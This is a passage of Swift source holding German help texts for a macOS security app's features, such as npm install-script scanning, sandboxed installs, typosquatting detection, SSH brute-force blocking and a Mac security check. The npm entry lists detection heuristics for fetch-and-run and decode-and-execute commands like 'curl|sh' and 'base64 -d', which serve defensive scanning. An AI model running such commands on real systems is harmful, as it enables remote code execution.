                summary: "Listet preinstall/install/postinstall/prepare-Skripte auf, die von package.json-Dateien unter node_modules deklariert werden. Zeigt Code, der bei npm install bedingungslos ausgeführt wird — kein Bedrohungsurteil. Nur Pro.",
                details: """
                • Öffnen: Menü „Malware-Schutz“ → „📦 Paket-CVE-Abgleich (Homebrew)…“ → Tab „Installationsskripte (npm) (Pro)“. Nutzt dieselben Projektordner wie der Tab „Abhängigkeiten“.
                • Umfang: eine Ebene unter node_modules (plus eine weitere Ebene für @scope/-Pakete). Steigt nie in das eigene node_modules eines Pakets ab.
                • Reine Referenzmarkierung: Befehle, die auf curl|sh, wget|sh, eval(, base64 -d oder node -e passen, erhalten ein ⚠️-Abzeichen — eine leichte Heuristik, kein Urteil; viele legitime Skripte (z. B. native Modul-Builds) treffen ebenfalls zu.
                • Keinerlei Netzwerkverbindung, und es wird nie etwas ausgeführt — eine rein statische Übersicht.
                • Abweichung vom geprüften Stand: Mit „Aktuellen Stand als geprüft markieren“ wird der aktuelle Stand der Pakete festgehalten (Skriptbefehle nur als Hashes, dazu ob ein Paket kompilierten Code enthält). Ab der nächsten Auflistung werden Pakete gezeigt, die seitdem Code für die Installation hinzubekommen haben: ein hinzugefügtes Skript, ein Skript mit geändertem Befehl, hinzugekommener kompilierter Code (`binding.gyp`, `.node`, `.so`, `.dylib`, `.dll` oder eine ausführbare Datei) und ein neues Paket, das eines davon mitbringt. Entfallene Skripte und Pakete werden nicht gezeigt. Nur eine Person kann den Stand als geprüft markieren; weder die Auflistung noch das MCP-Tool tut das (das MCP-Ergebnis enthält `drift` und `baselineAcceptedAt`). Der Eintrag liegt in `~/Library/Application Support/RoamSwitch/package_install_baseline.json` (Modus 0600).
                • MCP-Tool: `run_package_lifecycle_script_scan` (Argument `watchedFolders`, nur Pro).
                • Automatische Prüfung (Pro, standardmäßig an): Auch ohne Fenster oder MCP prüft die App die registrierten Projektordner selbst, wenn sich package.json, eine Lockfile oder node_modules/.package-lock.json ändert und wieder Ruhe einkehrt, kurz nach dem Start und einmal täglich. Sie sucht nach mehr Code, der bei der Installation läuft, und nach Abhängigkeitsnamen, die bekannten Paketen ähneln, und benachrichtigt Sie (kein Netzwerk, nichts wird ausgeführt). Ein Ordner ohne bestätigten Stand wird nicht verglichen; Sie erhalten einmal den Hinweis, ihn zu prüfen und festzuhalten. Nur ein Mensch kann einen Stand als bestätigt markieren; die automatische Prüfung verändert diese Aufzeichnung nie. Ein Menüeintrag schaltet sie ab.
                """,
                recommendation: "Prüfen Sie bei jedem ⚠️-markierten Skript, ob das Paket es wirklich benötigt — besonders bei postinstall-Skripten unbekannter Pakete."
            ),
            LocalizedEntry(
                id: "feat_npm_audit_signatures",
                title: "npm-Signatur-/Provenienzprüfung (npm audit signatures, Opt-in, Pro)",
                summary: "Kontaktiert die npm-Registry, um Signaturen/Provenienz installierter Pakete zu prüfen. Die einzige Funktion in RoamSwitch, die mit npmjs.com kommuniziert — standardmäßig aus, erfordert ausdrückliches Opt-in plus Bestätigung bei jedem Lauf. Nur Pro.",
                details: """
                • Aktivierung: der Schalter „npm-Signaturprüfung aktivieren“ im Tab „📦 Paket-CVE-Abgleich“ → „npm-Signaturprüfung (Opt-in) (Pro)“. Dies schaltet nur die Schaltfläche „Audit ausführen“ für jeden Projektordner frei — von sich aus wird nichts gesendet. Jeder Lauf wird mit „Mit der npm-Registry kommunizieren?“ bestätigt.
                • Ablauf: führt `npm audit signatures` mit dem Zielordner als Arbeitsverzeichnis aus und kontaktiert die npm-Registry (registry.npmjs.org). Dies ist die einzige RoamSwitch-Funktion, die mit npmjs.com kommuniziert.
                • Ausgabe: npms eigene Befehlsausgabe wird unverändert angezeigt (nie eigenständig interpretiert). Ein Exit-Code ungleich null oder Formulierungen wie „invalid“/„missing registry signature“ in der Ausgabe erhalten eine leichte Aufmerksamkeitsmarkierung.
                • Wird der npm-Befehl nicht gefunden, erscheint ein Hinweis, Node.js/npm zu installieren.
                • MCP-Tool: `run_npm_audit_signatures` (Argument `directory`, doppelt abgesichert durch Pro plus Opt-in-Schalter). `directory` wird nur innerhalb eines in RoamSwitch registrierten Projektordners akzeptiert. npm läuft mit auf registry.npmjs.org festgelegter Registry, ignoriert Benutzer-/Projekt-npm-Konfiguration und unterliegt einem Timeout von 90 Sekunden.
                """,
                recommendation: "Aktivieren Sie dies nur für ein Abhängigkeits-Audit vor einem Deployment oder bei der Untersuchung eines vermuteten Lieferketten-Kompromisses — es muss nicht dauerhaft an bleiben."
            ),
            LocalizedEntry(
                id: "feat_npm_sandboxed_install",
                title: "Sandbox-npm/pnpm-Installation (roamswitch-npm, Pro)",
                summary: "Ein echter Interventions-Wrapper – nicht nur Erkennung –, der ausschließlich die Ausführung von preinstall/install/postinstall/prepare-Skripten in einer Sandbox ohne Netzwerkzugriff einschließt (sandbox-exec) und die Installation tatsächlich für Sie durchführt. Nur Pro.",
                details: """
                • Aktivierung: Die Schaltfläche „Installieren“ unter „📦 Paket-CVE-Abgleich“ → „Sandbox-Installation (npm/pnpm) (Pro)“ platziert den Kommandozeilen-Wrapper `roamswitch-npm` unter ~/Library/Application Support/RoamSwitch/bin/.
                • Zweistufiger Ablauf: ① Die Download-Phase führt `npm install --ignore-scripts` / `pnpm install --ignore-scripts` normal mit Netzwerkzugriff aus. ② Die Skript-Phase führt `npm rebuild` / `pnpm rebuild` (plus `run prepare`, falls die Wurzel eines deklariert) unter einem sandbox-exec-Profil mit `(deny network-outbound)` aus.
                • Sandbox-Mechanismus: Die Linux-Version nutzt bwrap zur Dateisystem-Einschränkung; da macOS keine äquivalente Technik bietet, wird stattdessen eine Netzwerksperre verwendet, die auf echter Hardware verifiziert wurde (`(allow default)` + `(deny network-outbound)`). Dateizugriffe und das Starten von Kindprozessen werden nicht eingeschränkt.
                • Shell-Alias: Zwei Alias-Zeilen, die `npm`/`pnpm` über den Wrapper leiten, können an die Konfigurationsdatei Ihrer Shell angehängt werden (optional, nur Anhängen – vorhandener Inhalt bleibt unverändert).
                • Vorschau: Vor der Ausführung können Sie die Lifecycle-Skripte des Projektordners auflisten (derselbe Scanner wie bei „Übersicht der Installationsskripte“).
                • Ist sandbox-exec nicht verfügbar oder schlägt fehl, erfolgt niemals ein stiller Rückfall auf eine ungeschützte Ausführung. yarn wird nicht unterstützt. Es gibt kein GTK/MCP-Tool – es handelt sich um ein Kommandozeilen-Tool für das Terminal.
                """,
                recommendation: "Verwenden Sie für Projekte mit unbekannten Paketen oder aus externen Quellen bezogene Projekte `roamswitch-npm install` anstelle einer regulären npm/pnpm-Installation."
            ),
            LocalizedEntry(
                id: "feat_typosquat_guard",
                title: "Typosquatting-Erkennung (npm/pnpm package.json, Pro)",
                summary: "Vergleicht Abhängigkeitsnamen in package.json per Editierdistanz (Levenshtein 1-2) mit einer Liste beliebter npm-Paketnamen und markiert mögliches Typosquatting wie expres→express oder loadash→lodash. Die App selbst stellt dafür keine Netzwerkverbindung her. Nur Pro.",
                details: """
                • Umfang: nur die eigenen dependencies/devDependencies/optionalDependencies des Projekts in package.json (peerDependencies ist ausgenommen). node_modules (bereits installierte transitive Abhängigkeiten) ist ebenfalls bewusst ausgenommen — ein Tippfehler entsteht in dem Moment, in dem ein Mensch eine Abhängigkeit zu package.json hinzufügt.
                • Abgleichlogik: eine standardmäßige DP-Implementierung der Levenshtein-Distanz prüft jeden Abhängigkeitsnamen gegen eine Liste beliebter npm-Paketnamen. Paket mit Scope (`@scope/pkg`) werden anhand des Basisnamens (`pkg`) verglichen. Kandidaten mit mehr als 2 Zeichen Längenunterschied werden durch einen günstigen Vorfilter übersprungen. Der Schwellenwert liegt bei Editierdistanz bis 2 für beliebte Namen ab 8 Zeichen, sonst nur Distanz 1.
                • Wie die Liste aktuell bleibt: Die Liste beliebter Paketnamen wird von `PackageCveMapUpdater` über dasselbe nur empfangende, Ed25519-signierte Manifest (etwa einmal pro Woche abgerufen) wie die CVE-Maps verteilt (ein eingebauter Seed zur Build-Zeit plus eine zweistufige Aktualisierung, wobei die Version mit der neueren `mapVersion` bevorzugt wird). Die Liste kann aktualisiert werden, ohne auf ein App-Release zu warten.
                • Referenzinformation, kein Urteil — eine bekannte Positivliste unterdrückt einige legitime Doppelgänger-Pakete (z. B. preact), ist aber nicht vollständig.
                • Öffnen: Tab „📦 Paket-CVE-Abgleich“ → „Typosquatting-Erkennung (Pro)“, bezogen auf dieselben Projektordner wie der Tab „Abhängigkeiten“. MCP: `run_typosquat_scan` (Argument `watchedFolders`, nur Pro).
                • Automatische Prüfung (Pro, standardmäßig an): Auch ohne Fenster oder MCP prüft die App die registrierten Projektordner selbst, wenn sich package.json, eine Lockfile oder node_modules/.package-lock.json ändert und wieder Ruhe einkehrt, kurz nach dem Start und einmal täglich. Sie sucht nach mehr Code, der bei der Installation läuft, und nach Abhängigkeitsnamen, die bekannten Paketen ähneln, und benachrichtigt Sie (kein Netzwerk, nichts wird ausgeführt). Ein Ordner ohne bestätigten Stand wird nicht verglichen; Sie erhalten einmal den Hinweis, ihn zu prüfen und festzuhalten. Nur ein Mensch kann einen Stand als bestätigt markieren; die automatische Prüfung verändert diese Aufzeichnung nie. Ein Menüeintrag schaltet sie ab.
                """,
                recommendation: "Prüfen Sie jede mit ⚠️ markierte Abhängigkeit noch einmal auf einen tatsächlichen Tippfehler — achten Sie besonders auf unbekannte Paketnamen."
            ),
            LocalizedEntry(
                id: "feat_dependency_source_scan",
                title: "Prüfung der Abhängigkeitsquellen (pip / npm, Pro)",
                summary: "Liest Projektdateien und sucht Einstellungen, die Dependency Confusion erlauben (ein öffentliches Paket ersetzt ein privates mit gleichem Namen): extra-index-url bei pip und npm-Scopes aus einer privaten Registry, die keine .npmrc festlegt.",
                details: """
                • Gemeldet wird: ① `pip_extra_index_url` – eine Zeile `--extra-index-url` / `extra-index-url` in requirements*.txt, pip.conf, pyproject.toml oder uv.toml. pip fragt diese Quelle und PyPI ab und nimmt die höchste Version; ein öffentliches Paket gleichen Namens mit höherer Version gewinnt. ② `npm_scope_not_pinned` – eine npm-Lockdatei (package-lock.json, npm-shrinkwrap.json, yarn.lock v1, pnpm-lock.yaml) löst Pakete eines @Scopes aus einer anderen Registry als npmjs.org auf, und keine .npmrc im Projekt, in den Ordnern darüber bis zum registrierten Ordner oder im Home-Ordner ordnet diesen Scope mit `@scope:registry=` zu.
                • Nicht getan wird: Es wird keine Registry gefragt, ob ein Name frei ist, es gibt keine Netzwerkanfrage und nichts wird ausgeführt. Ein Fund ist eine Warnung zu einer Einstellung, kein Beweis für einen Angriff; auch eine private Quelle, in der diese Namen allein existieren, wird aufgeführt. Zugangsdaten in einer URL werden verworfen, nur der Host wird angezeigt.
                • Nicht abgedeckt: npm-Pakete ohne Scope aus einer privaten Registry (keine .npmrc-Angabe kann sie festlegen), yarn-Berry-Lockdateien (sie speichern die Quelle nicht), Poetry-Quellen, uv `[[tool.uv.index]]` und Index-URLs, die nicht http(s) sind.
                • Öffnen: Tab „📦 Paket-CVE-Abgleich“ → „Abhängigkeitsquellen (Pro)“, bezogen auf dieselben Projektordner wie der Tab „Abhängigkeiten“. MCP: `run_dependency_source_scan` (Argument `watchedFolders`, nur Pro).
                """,
                recommendation: "Bei pip ist ein einziges `--index-url` auf einen privaten, PyPI spiegelnden Index besser als `--extra-index-url`. Bei npm fügen Sie für jeden privaten Scope `@scope:registry=<Ihre Registry>` in die .npmrc des Projekts ein."
            ),
            LocalizedEntry(
                id: "feat_port_scan_guard",
                title: "Erkennung eingehender Portscans (Auto-Blockierung, Pro)",
                summary: "Erkennt eine Quell-IP, die innerhalb kurzer Zeit (5 Minuten) viele verschiedene Ports (15 oder mehr) angesprochen hat — die klassische Signatur von Aufklärungswerkzeugen wie nmap/masscan — und benachrichtigt darüber. Eine erkannte Scan-Quelle wird standardmäßig 10 Minuten lang automatisch blockiert. Nur Pro.",
                details: """
                • Funktionsweise: Der privilegierte Helper überwacht die pf-(Paketfilter-)Protokolle über `tcpdump -i pflog0` und markiert eine Quell-IP, die innerhalb eines kurzen Zeitfensters genügend unterschiedliche Zielports erreicht. Die Erkennung basiert ausschließlich auf Protokolleinträgen; der Datenverkehr selbst wird dabei weder verändert noch inspiziert. Entspricht `port_scan_detect.rs` der Linux-Edition (nftables `log` + `journalctl`).
                • Automatische Blockierung: Eine erkannte Scan-Quelle wird standardmäßig 10 Minuten lang über `PFRulesetCoordinator` per pf-Regel blockiert. Die automatische Blockierung lässt sich unabhängig von der Erkennungsfunktion selbst umschalten.
                • Benachrichtigungen: Bei jeder Erkennung (und Blockierung) wird eine macOS-Benachrichtigung ausgelöst und zusätzlich in der einheitlichen Vorfall-Zeitleiste festgehalten.
                • Öffnen: Menüleiste → „Port- & Geräteüberwachung“ → „🔍 Erkennung eingehender Portscans (Pro)“. Sowohl das Aktivieren als auch das Deaktivieren erfordert eine Bestätigung. Wird bei der Pro-Aktivierung automatisch eingeschaltet (eine eigene Entscheidung dagegen bleibt erhalten). Solange der privilegierte Helper nicht genehmigt ist, passiert nichts; nach der Genehmigung startet die Funktion von selbst. Nur die automatische Blockierung lässt sich im selben Menü über „Quellen eingehender Portscans automatisch blockieren (10 Min.)“ getrennt ausschalten.
                """,
                recommendation: "Es gibt keine IP-bezogene Positivliste, und eine Blockierung wird nach 10 Minuten automatisch aufgehoben. Wenn Sie zu Hause oder im Unternehmen regelmäßig ein legitimes Scan-Tool (Bestandsaufnahme, Schwachstellenscan usw.) einsetzen, sollten Sie währenddessen die automatische Blockierung deaktivieren (nur Erkennung/Benachrichtigung beibehalten), um wiederholte Fehlalarm-Blockierungen zu vermeiden."
            ),
            LocalizedEntry(
                id: "feat_ssh_guard",
                title: "SSH-Brute-Force-Erkennung und -Sperre (Pro)",
                summary: "Liest das sshd-Protokoll nur, solange die Fernanmeldung (SSH) aktiv ist, erkennt Quellen mit vielen fehlgeschlagenen Anmeldungen in kurzer Zeit und benachrichtigt Sie. Standardmäßig blockiert es neue SSH-Verbindungen dieser Quelle eine Stunde lang (bei jeder Wiederholung 4-mal so lange, höchstens 7 Tage). Nur Pro.",
                details: """
                • Funktionsweise: Der privilegierte Helfer liest sshd-Zeilen über `log stream` (das einheitliche Protokoll). Auf einem Mac mit deaktivierter Fernanmeldung wird nichts gelesen (einmal pro Minute wird nur geprüft, ob der Dienst geladen ist). Da der Benutzername in einer Protokollzeile vom Angreifer gewählt wird, wertet der Helfer die Zeilen nicht selbst aus, sondern ein getrennter Prozess mit abgegebenen Rechten. Die Quelladresse wird vom Zeilenende gelesen (dem Teil, den sshd selbst schreibt); eine falsche Adresse im Benutzernamen kann also keinen Dritten sperren lassen. Zeilen, die nicht von sshd stammen (z. B. `logger -t sshd`), werden ignoriert.
                • Gezählte Fehlschläge: `Failed password`, `Invalid user`, Trennung vor der Authentifizierung und `maximum authentication attempts exceeded`. Ein Versuch erscheint auf mehreren Zeilen und wird nicht doppelt gezählt; `Failed publickey` zählt nicht. Standard: 6 innerhalb von 10 Minuten. IPv6 wird je /64 gezählt.
                • Sperre: Eine pf-Regel verwirft nur neue Verbindungen (SYN) zu den SSH-Ports (22 und jeder Port aus sshd_config). Bestehende Sitzungen werden nicht getrennt. Gateway, DNS und die eigene Adresse dieses Macs werden nie gesperrt. Die Sperre wird getrennt von Portscan-Sperre, VPN-Kill-Switch und Port-Sperre verwaltet, sodass keine die andere stört. Eine Netzwerkisolierung (Air-Gap) wird nie ausgelöst. Abgelaufene Sperren werden von einem Durchlauf pro Minute aufgehoben, daher kann eine Sperre bis zu eine Minute länger dauern.
                • Ausnahmen: Quellen auf Ihrer Ausnahmeliste (IP/CIDR), Quellen mit gerade offener SSH-Verbindung und Quellen mit erfolgreicher Public-Key-Anmeldung innerhalb von 30 Tagen werden nie gesperrt. Läuft auf dem Mac fail2ban, sshguard oder DenyHosts, überlässt RoamSwitch ihnen das Sperren und benachrichtigt nur.
                • Benachrichtigungen: nur bei einer Sperre und wenn eine Anmeldung von einer zuvor scheiternden Quelle gelingt (kritisch; die Sitzung wird nicht getrennt), je Quelle zusammengefasst. Ein einzelner Fehlschlag löst nie eine Benachrichtigung aus. Anmeldungen (Accepted) werden mit Quelle, Konto, Authentifizierungsmethode und Schlüssel-Fingerabdruck aufgezeichnet (die letzten 200) und liefern auch den Hinweis in Benachrichtigungen über manipulierte Systemdateien. ATT&CK: T1110.
                • Öffnen: Menüleiste → „Port- und Geräteüberwachung“ → „🔑 SSH-Brute-Force erkennen und blockieren (Pro)“. Grenzwerte, Ausnahmeliste und die Liste gesperrter Quellen (mit Freigabe) stehen unter „Einstellungen zur SSH-Brute-Force-Sperre…“. Wird bei der Pro-Aktivierung automatisch eingeschaltet (eine selbst getroffene Abschaltung bleibt erhalten). MCP: `get_ssh_guard_incidents` (nur lesend).
                • SSH-Quellen beschränken (Pro, standardmäßig aus): In „Einstellungen zur SSH-Brute-Force-Sperre…“ nimmt „SSH-Quellen beschränken“ die erlaubten IP-Adressen oder Bereiche entgegen (IPv4 und IPv6, CIDR möglich, bis zu 64 Zeilen). Ist es an, weist pf neue Verbindungen (SYN) zu den SSH-Ports von Quellen außerhalb der Liste ab. Bereits offene Sitzungen werden nicht getrennt. Dieser Mac selbst und Loopback sind auch ohne Eintrag erlaubt. Der privilegierte Helfer lehnt das Einschalten ab, wenn die Liste leer ist oder eine jetzt offene Anmeldung nicht in der Liste steht (die Prüfung der App wird nicht für bare Münze genommen). Lädt die Regel nicht in pf, wird sie nicht als an angezeigt. Verbindungen über ein VPN (z. B. Tailscale) werden nach der Quelladresse beurteilt; tragen Sie den nötigen Bereich ein (bei Tailscale 100.64.0.0/10). Der Zustand kehrt nach einem Neustart des Helfers und des Macs zurück; ein in sshd_config ergänzter Port wird binnen einer Minute übernommen. Es wird keine Pass-Regel hinzugefügt, die Regel kommt also nicht an einem VPN-Kill-Switch vorbei. Sie ist von den Brute-Force-Sperren getrennt, beide beeinflussen sich nicht. Endet Pro, wird sie nicht automatisch entfernt; mit „Beschränkung aufheben“ können Sie sie jederzeit selbst entfernen.
                """,
                recommendation: "Ändert sich Ihre eigene Adresse unterwegs, melden Sie sich vorher einmal per Public Key an oder tragen Sie den Bereich in die Ausnahmeliste ein, damit Sie nicht versehentlich gesperrt werden. Sind Sie gesperrt, geben Sie die Sperre in der Liste im Einstellungsfenster frei. Wer die Passwort-Authentifizierung abschaltet und nur Public Keys erlaubt, macht Brute Force wirkungslos."
            ),
            LocalizedEntry(
                id: "feat_sensor_pairing",
                title: "RoamSwitch Sensor-Kopplung (Kopplungscode, Pro)",
                summary: "Verwaltet die gegenseitige Vertrauenskopplung mit einem separaten Produkt, „RoamSwitch Sensor“ (ein dedizierter aktiver Prüf-Hub), im selben LAN. Verwendet einen aktiven Kopplungscode-Ablauf, den der Sensor ausstellt — keine automatische mDNS-Erkennung, da ein Sensor mit fester IP-Adresse betrieben wird. Nur Pro.",
                details: """
                • Funktionsweise: Erzeugt und speichert dauerhaft ein eigenes Ed25519-Schlüsselpaar dieses Geräts. Zur Kopplung verbindet sich dieses Gerät mit dem TCP-Listener des Sensors (Port 50543) und übermittelt einen vom Sensor-Bediener ausgestellten Einmal-Kopplungscode (läuft 10 Minuten nach Ausstellung ab) sowie die eigene Adresse/den eigenen Hostnamen. Ist der Code gültig, nimmt der Sensor den öffentlichen Schlüssel dieses Geräts in seine Vertrauensliste auf.
                • Prüfung anfordern: Nach der Kopplung kann über „Prüfung beim Sensor anfordern“ eine aktive Prüfung (Erreichbarkeitsverifikation) beim Sensor angestoßen werden. Da der Sensor Ergebnisse asynchron erzeugt, fragt der stets aktive privilegierte Helfer dieses Geräts das Ergebnis alle 5 Minuten, bis zu 5-mal, ab. Abgerufene Ergebnisse werden auch auf diesem Gerät gespeichert und unter „Prüfergebnisse“ in den Einstellungen angezeigt.
                • Öffnen: Menüleiste → „Port- & Geräteüberwachung“ → „🔍 RoamSwitch Sensor-Kopplung …“. Zeigt den eigenen öffentlichen Schlüssel/die Adresse dieses Geräts (mit Kopieren-Schaltfläche), gekoppelte Sensoren (mit Entkoppeln-Schaltfläche), ein Eingabeformular für den Kopplungscode sowie die Liste der Prüfergebnisse.
                • Verwendet dasselbe TCP-Steuerprotokoll wie die Linux-Edition (`roamswitch-core::sensor_pairing`) — Port 50543, zeilengetrenntes JSON, Ed25519-Signaturen.
                • Schutz der Übertragung (TLS): Die Steuer-API wird über TLS 1.3 angesprochen; dem Zertifikat des Sensors wird nur durch Pinning seines Fingerabdrucks (SHA-256 des Zertifikats) vertraut (keine CA- oder Hostnamen-Prüfung). Beim Koppeln geben Sie den auf dem Bildschirm des Sensors angezeigten Fingerabdruck von Hand ein (er wird nie über das Netzwerk abgerufen). Die Kopplungsanfrage wird per Signatur an diesen Fingerabdruck und den Schlüssel dieses Geräts gebunden, sodass ein Man-in-the-Middle mit anderem Zertifikat scheitert. Erzeugt der Sensor sein Zertifikat neu (tls rotate), werden Verbindungen abgelehnt; mit „Fingerabdruck registrieren/aktualisieren“ pinnen Sie den neuen Wert vom Sensor-Bildschirm neu (nie automatisch). Ein vor der Pinning-Funktion gekoppelter Sensor nutzt weiter Klartext (mit Warnung im Fenster); bei TLS-Fehlern gibt es keinen automatischen Rückfall auf Klartext.
                """,
                recommendation: "Verwenden Sie nur einen Kopplungscode, der tatsächlich über den Bediener-Bildschirm eines von Ihnen selbst eingerichteten Sensors ausgestellt wurde. Werden Sie zur Eingabe eines unbekannten Codes aufgefordert, koppeln Sie sich nicht — fragen Sie stattdessen bei der zuständigen Netzwerkverwaltung nach."
            ),
            LocalizedEntry(
                id: "feat_security_health_checker",
                title: "Mac-Sicherheitsprüfung (23 Punkte, Punktzahl & Korrekturschritte)",
                summary: "Prüft 23 Punkte in sechs Bereichen (Systemhärtung, Netzwerkverteidigung, Authentifizierung und Zugriffskontrolle, Portexposition, Malware-Schutz sowie physischer Geräteschutz) und zeigt eine Punktzahl von 0 bis 100, eine Note sowie Korrekturschritte für jeden nicht bestandenen Punkt. In der kostenlosen Version enthalten.",
                details: """
                • Systemhärtung: 1. FileVault, 2. SIP (Systemintegritätsschutz), 3. Gatekeeper, 4. automatische Sicherheitsupdates, 5. Apple XProtect, 6. Backup (neuestes Time-Machine-Backup höchstens 7 Tage alt; Wiederherstellbarkeit wird nicht geprüft).
                • Netzwerkverteidigung: 7. macOS-Firewall, 8. Tarnmodus, 9. WLAN-Verschlüsselungsstärke, 10. ARP-Spoofing-Überwachung, 11. Gateway-ARP-Fixierung, 12. automatische Proxy-Erkennung (WPAD / PAC).
                • Authentifizierung & Zugriffskontrolle: 13. SSH-Fernanmeldungskonfiguration (Root-Anmeldung deaktiviert, nur Schlüsselauthentifizierung), 14. sudo-Rechteausweitung (`NOPASSWD`-Prüfung), 15. Anmeldedateien von KI-Agenten.
                • Dienste & Portexposition: 16. offengelegte Ports.
                • Malware- & Download-Schutz: 17. Web- & E-Mail-Schutz, 18. DNS-Bedrohungsschutz, 19. Phishing- und Malware-Link-Schutz (Safari-Betrugsseiten-Warnung).
                • Physische Ports & Geräte: 20. Physischer Portschutz vor unbefugtem USB / BadUSB, 21. macOS-Zubehörverbindungsschutz.
                • Nicht anwendbar: Firewall und Tarnmodus in einem vertrauenswürdigen Netzwerk, SSH bei deaktivierter Fernanmeldung sowie die sudo-Prüfung vor Verbindung des Helfers werden von der Punktzahl ausgeschlossen.
                • 22. Hinzugefügte vertrauenswürdige Zertifikate (Zertifizierungsstellen) (`trust_anchors`, Netzwerkschutz): liest `security dump-trust-settings` für den Benutzerbereich und den Administratorbereich. Ein Zertifikat hat dort nur dann Vertrauenseinstellungen, wenn eine Person, ein Administrator oder ein Profil sie gesetzt hat; die aufgelisteten Zertifikate sind also solche, die jemand hinzugefügt hat. Apples eigene Stammzertifikate werden nicht gezählt, ebenso wenig ein Zertifikat, dessen Vertrauensergebnis „deny“ (Misstrauen) ist. Sieht der Name eines hinzugefügten Zertifikats nach einem Abhörwerkzeug aus (mitm, proxy, charles, fiddler, burp, portswigger, zscaler, netskope, squid, inspection, sslsplit), schlägt die Prüfung fehl und nennt es (höchstens 3 Namen). Jedes andere hinzugefügte Zertifikat (ein Firmen-Stammzertifikat, mkcert) wird als Information angezeigt, und die Prüfung gilt als bestanden (in Ordnung, wenn Sie es selbst eingerichtet haben). Lässt sich der Befehl nicht lesen, lautet das Ergebnis „konnte nicht geprüft werden“. Warum: Ein Proxy, der verschlüsselten Datenverkehr einschließlich Passwörtern und API-Schlüsseln liest, braucht das Vertrauen des Mac in seine Zertifizierungsstelle. Nicht sichtbar: ein Zertifikat, das eine Anwendung selbst mitbringt, und der Zeitpunkt, zu dem ein Zertifikat hinzugefügt wurde; ein neues wird beim Erscheinen nicht gemeldet. Erkennungsabdeckung: T1553.004 (teilweise). Es ändert nichts und sendet nichts.
                • 23. Leicht ausnutzbare Schwachstellen (installierte Software) (`package_cve_exposure`, Systemhärtung): prüft die Homebrew-Pakete und PHP. Die mit `brew list --versions` gelesenen Homebrew-Pakete werden mit den signierten Daten zu bekannten CVEs (für Homebrew) abgeglichen, die der Updater liefert, und mit der täglich eintreffenden KEV-Liste der CISA. Der Punkt gilt als nicht bestanden, wenn eine von der CISA als ausgenutzt bestätigte Schwachstelle (KEV) oder eine mit EPSS von 90 % oder mehr in einer betroffenen Version bleibt; genannt werden Paketname und CVE-Nummer (in der Statuszeile bis zu 3). Befunde mit einer nicht abgelaufenen Risikoakzeptanz zählen nicht. Bei PHP werden die Version der ausführbaren Dateien in Homebrew, MAMP, Herd und PATH sowie die Einstellungen von php.ini, FPM und Apache gelesen. PHP fällt durch bei einer Version vor der Korrektur (die beiden kritischen Schwachstellen CVE-2026-109618 und CVE-2026-109619; korrigiert in 8.2.35, 8.3.36, 8.4.27 und 8.5.12; für 8.1 und älter gibt es keine Korrektur) oder bei den Bedingungen von CVE-2026-115560 (eine Einstellung php_binary oder php_serialize, Anwendungscode, der sie mit ini_set() umschaltet, und aktiviertes upload_progress, alles zugleich; noch keine Korrektur). Hinweise mittlerer oder geringerer Schwere, etwa mod_php oder aktiviertes upload_progress, lassen den Punkt nicht durchfallen. Ein Homebrew-php, das in den Daten steht, wird nach den Daten gezählt, nicht doppelt. PHP-Programme werden nur gestartet, um die Version auszugeben. Keine Netzwerkverbindung. Das Ergebnis wird 30 Minuten behalten; dauert die Prüfung länger als 20 Sekunden, steht dort „Nicht prüfbar“. Ohne Homebrew-Pakete und ohne PHP ist der Punkt nicht zutreffend und zählt nicht zur Bewertung. Fehlen die Daten, steht ebenfalls „Nicht prüfbar“. Nicht sichtbar sind andere Software als PHP, die nicht mit Homebrew installiert wurde, Schwachstellen ohne Eintrag in den Daten und CVEs, die erst nach der neuesten KEV-Liste in die KEV-Liste kamen (die Detailzeile nennt Datenversion und KEV-Datum). PHP-Sitzungsdateien liest die Prüfung der Webshell-Erkennung, nicht dieser Punkt. Die Statuszeile nennt, wie viele der installierten Pakete in den Daten stehen.
                • Noten: 100 = S, 85–99 = A, 70–84 = B, unter 70 = C. Auch über das MCP-Tool `get_security_report` abrufbar.
                • Status der Schutzfunktionen: ein Fenster, das Schutzfunktion für Schutzfunktion (36) zeigt, ob eine eingeschaltete Schutzfunktion wirklich arbeitet. Öffnen Sie es im Menü (Mac-Sicherheitsdiagnose > 🛡️ Status der Schutzfunktionen …) oder mit „Alle Schutzfunktionen anzeigen …“ auf der Karte am Anfang des Diagnoseberichts (eine Zusammenfassung und nur die Schutzfunktionen, die nicht arbeiten). Es gibt fünf Zustände: Wirkt, Nur teilweise aktiv, Wirkt nicht, Aus und Nur Pro. Bei einer Schutzfunktion, die nicht arbeitet, stehen der Grundcode (z. B. `pro_not_active`, `helper_not_connected`, `system_extension_not_approved`) und ein Satz zu Ursache und Abhilfe; je nach Grund gibt es auch eine Schaltfläche: „Pro aktivieren …“, „Helper genehmigen …“ oder „Systemeinstellungen öffnen …“. Die Anzeige wird alle 15 Sekunden und mit „Erneut prüfen“ neu gelesen. Eine Pro-Funktion, die auf einem Mac ohne Pro nur standardmäßig eingeschaltet ist, steht als „Nur Pro“ da und zählt nicht als Fehler. Solange eine Schutzfunktion nicht arbeitet, steht oben im Menü zusätzlich eine Zeile „⚠️ Manche Schutzfunktionen wirken nicht (N). Gründe ansehen …“. Das Urteil beruht auf denselben Daten wie die Menümarkierungen, die Benachrichtigungen und das MCP-Tool `get_guard_status`. Wenn die Aktualisierung der Erkennungsdaten stehen geblieben ist (`state_stale`), gibt es keine Benachrichtigung; sie erscheint nur im Menü und in diesem Fenster.
                """,
                recommendation: "Öffnen Sie den Prüfbericht regelmäßig, arbeiten Sie die mit ⚠️ markierten Punkte anhand der Korrekturschritte ab und halten Sie mindestens Note A."
            ),
            LocalizedEntry(
                id: "feat_autonomous_sentinel",
                title: "Autonome Hintergrundpatrouille, ClamAV-Definitionsaktualisierung & geplante Scans",
                summary: "Aktualisiert alle 4 Stunden im Hintergrund Sicherheitsprüfung, Ports, USB-Geräte und XProtect-Status (alle Versionen). Pro warnt zusätzlich bei Punktzahl-Rückgang, aktualisiert ClamAV-Definitionen automatisch und führt täglich einen Virenscan durch.",
                details: """
                • Regelmäßige Prüfung (alle Versionen): Etwa 30 Sekunden nach dem Start und danach alle 4 Stunden, sodass die Ergebnisse aktuell bleiben, auch wenn Sie stundenlang in einem Netzwerk bleiben.
                • Warnung bei Punktzahl-Rückgang (Pro): Benachrichtigt, wenn die Punktzahl unter 80 fällt oder 4 oder mehr Punkte nicht bestehen.
                • ClamAV-Definitionen (Pro): Führt `freshclam` still aus.
